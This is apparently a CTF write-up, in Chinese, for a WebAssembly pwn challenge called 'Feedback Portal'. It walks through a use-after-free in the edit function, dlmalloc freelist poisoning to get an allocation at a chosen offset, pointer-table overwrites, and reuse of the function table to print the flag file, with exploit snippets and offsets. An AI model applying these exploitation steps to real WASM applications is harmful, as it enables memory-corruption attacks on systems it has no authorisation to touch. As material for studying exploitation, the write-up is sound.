# Feedback Portal

## 题目简述

题目程序是 WebAssembly 模块，由 Wasmtime 21.0.1 运行，提供创建、编辑、删除反馈和进入 TUI 四个功能。内存分配器是 WASM 线性内存中的 dlmalloc，不是宿主 libc 的 ptmalloc。

删除功能存在索引越界，但只能稳定制造崩溃。真正可利用的问题在 `edit`：当新内容大于旧堆块时，旧块会被释放，反馈指针表却没有更新，形成 UAF。通过覆盖 dlmalloc 空闲链指针，可以把下一次分配引到任意线性内存偏移。

## 解题过程

### 还原 WASM 内存布局

先用 WABT 同时生成文本和可供原生分析的 C：

```bash
wasm2wat chall -o chall.wat
wasm2c chall -o chall.c
```

`wasm2c` 结果配合运行时调试可确认：

- 反馈堆指针表位于线性内存偏移 `0x14c0`；
- 静态字符串 `banner.txt` 位于 `0x424`；
- 打开模式 `"r"` 位于 `0x42f`；
- TUI 的控制结构在本构建约 `0x1228`，其中 `+0x14` 控制是否间接调用，`+0x20` 保存函数表下标；
- 函数表下标 6 对应原程序已有的文件读取并输出路径。

这些都是模块内偏移，不需要宿主 ASLR 地址。

### 从 UAF 获得定点分配

先创建两个相同大小的反馈，再用超长内容编辑第 0 项：

```python
create(0x40, b"A")
create(0x40, b"B")
edit(0, b"C" * 0x60 + b"\n")
```

编辑逻辑释放旧块并申请新块，但第 0 项仍能访问已释放块。再次编辑第 0 项即可覆盖 dlmalloc 空闲块的 `fd`。考虑分配器元数据偏移后，把它改为指向 `0x14c0` 附近：

```python
edit(0, p32(0x14c0 - 0x30 - 8) + b"\n")
create(0x40, b"\x00")
create(0x40, b"\x00")
```

第二次分配会落到反馈指针表附近。此后写入一组伪反馈指针，让不同索引分别指向：

```text
0x424             静态文件名
0x1228 + 0x14     TUI 调用开关
0x1228 + 0x20     TUI 函数表下标
```

### 复用程序已有的文件输出函数

通过伪指针执行三次定点写：

```python
edit(filename_index, b"flag.txt\x00\n")
edit(table_index, p32(6) + b"\n")
edit(enable_index, p32(1) + b"\n")
tui()
```

这样无需劫持 Wasmtime 宿主控制流。TUI 按被修改的控制结构从函数表取出下标 6，调用模块本来就有的文件打开、读取和输出逻辑；文件名已从 `banner.txt` 改成 `flag.txt`，最终直接打印 flag。

完整的线性内存定位和利用脚本见 [R3CTF Pwn 复现记录](https://xshhc.github.io/2024/07/29/2024_R3CTF_part1/)。本文已区分无效的越界删除与真正的 UAF，并保留 dlmalloc 定点分配、指针表覆盖和函数表复用的关键偏移关系。

## 方法总结

WASM Pwn 要把两层地址空间分开：模块线性内存偏移通常稳定，宿主 JIT 地址则受 ASLR 影响。本题没有必要攻击 Wasmtime；利用模块自身 dlmalloc 的 UAF，把反馈指针表变成任意写，再复用模块已有文件读取函数更短也更稳定。看到一个能崩溃的越界点不等于找到利用点，必须继续检查对象生命周期和指针更新是否一致。
